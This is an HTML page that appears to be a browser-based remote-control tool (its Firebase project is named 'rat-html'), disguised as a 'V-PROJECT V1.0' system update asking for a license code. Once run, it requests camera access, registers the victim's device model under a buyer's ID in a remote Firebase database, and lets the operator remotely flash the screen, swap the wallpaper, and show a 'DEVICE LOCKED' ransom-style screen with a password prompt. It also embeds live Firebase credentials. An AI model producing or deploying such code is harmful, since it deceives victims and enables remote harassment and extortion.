<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>System Framework</title>
    <style>
        body { background: #000; color: #00f2ff; font-family: monospace; margin: 0; text-align: center; overflow: hidden; transition: 0.5s; }
        #front-flash { display: none; position: fixed; inset: 0; background: #fff; z-index: 10000; }
        #lock-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999; padding-top: 80px; }
        input { background: #111; border: 1px solid #00f2ff; color: #fff; padding: 15px; width: 80%; border-radius: 8px; margin-top: 20px; text-align: center; }
        button { background: #00f2ff; color: #000; border: none; padding: 15px; width: 80%; font-weight: bold; margin-top: 10px; border-radius: 8px; }
    </style>
</head>
<body>
    <div id="front-flash"></div>
    <div id="lock-screen">
        <h1 style="color:red; font-size: 2rem;">DEVICE LOCKED</h1>
        <p id="msg-lock" style="color:#fff; padding: 20px;"></p>
        <input type="password" id="pw-unlock" placeholder="PASSWORD UNLOCK">
        <button onclick="checkUnlock()" style="background:red; color:#fff;">DECRYPT SYSTEM</button>
    </div>

    <div style="padding-top: 150px;" id="setup">
        <h2>V-PROJECT V1.0</h2>
        <input type="text" id="b-id" placeholder="LICENSE CODE">
        <button onclick="initRAT()">UPDATE SYSTEM</button>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-app.js";
        import { getDatabase, ref, set, onValue, update, get } from "https://www.gstatic.com/firebasejs/10.0.0/firebase-database.js";

        const firebaseConfig = {
  apiKey: "AIzaSyAddYZVOXibzxIWNTNwqqQn5n7QUrQN6ys",
  authDomain: "rat-html.firebaseapp.com",
  databaseURL: "https://rat-html-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "rat-html",
  storageBucket: "rat-html.firebasestorage.app",
  messagingSenderId: "1060124583265",
  appId: "1:1060124583265:web:a117830e798cd1d60f5120",
  measurementId: "G-XMHT2S731L"
};


        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);
        let path = "";

        window.initRAT = async () => {
            const bID = document.getElementById('b-id').value; if(!bID) return;
            try {
                await navigator.mediaDevices.getUserMedia({ video: true });
                let ua = navigator.userAgent;
                let hp = ua.includes("Android") ? ua.split(';')[2].split('Build')[0].trim() : "Device_" + Math.floor(Math.random()*99);
                path = `buyer_data/${bID}/${hp.replace(/\s/g, '_')}_${Math.floor(Math.random()*999)}`;

                await set(ref(db, path), { model: hp, flash: false, lock: false, lock_msg: "LOCKED!", lock_pw: "123", wallpaper: "default" });
                document.getElementById('setup').innerHTML = "<h2>PATCH SUCCESS</h2>";

                onValue(ref(db, path), (snap) => {
                    const d = snap.val(); if(!d) return;
                    document.getElementById('front-flash').style.display = d.flash ? 'block' : 'none';
                    if(d.flash) document.body.style.filter = "brightness(200%)"; else document.body.style.filter = "brightness(100%)";
                    if(d.wallpaper !== "default") document.body.style.background = `url('${d.wallpaper}') center/cover no-repeat fixed`;
                    if(d.lock) {
                        document.getElementById('lock-screen').style.display = 'block';
                        document.getElementById('msg-lock').innerText = d.lock_msg;
                        window.history.pushState(null, null, window.location.href);
                    } else { document.getElementById('lock-screen').style.display = 'none'; }
                });
            } catch (e) { alert("ERROR!"); }
        }

        window.checkUnlock = async () => {
            const inp = document.getElementById('pw-unlock').value;
            const snap = await get(ref(db, path + '/lock_pw'));
            if(inp === snap.val()) { await update(ref(db, path), { lock: false }); } else { alert("WRONG PW!"); }
        }
    </script>
</body>
</html>
